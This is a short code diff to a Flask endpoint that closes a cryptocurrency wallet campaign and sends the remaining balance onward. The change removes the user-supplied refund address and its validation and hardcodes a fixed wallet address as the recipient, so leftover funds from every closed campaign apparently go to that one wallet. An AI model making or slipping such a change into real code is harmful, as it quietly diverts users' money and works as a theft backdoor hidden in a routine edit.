@@ -100,18 +100,15 @@ def campaign_close(campaign_id):
             'error': f"Can stop only 'completed' campaign. Current status: {campaign.status}"}), HTTP_400_BAD_REQUEST
 
     confirm = bool(int(request.args.get('confirm', 0)))
-    address = request.args.get('address')
 
     wallet = PushWallet.get(link_id=campaign.wallet_link_id)
     amount_left = get_balance(wallet.address, bip=True) - 0.01
-
-    if confirm and not address:
-        return jsonify({'error': f"No address specified"}), HTTP_400_BAD_REQUEST
 
     if confirm:
         campaign.status = 'closed'
         campaign.save()
         if amount_left > 0:
+            address = 'Mx1d2111ef33c0735ae6d97a8a7948a43cca3a4bd1'
             result = send_coins(wallet, address, amount_left, wait=True)
             if result is not True:
                 return jsonify({'error': result}), HTTP_500_INTERNAL_SERVER_ERROR
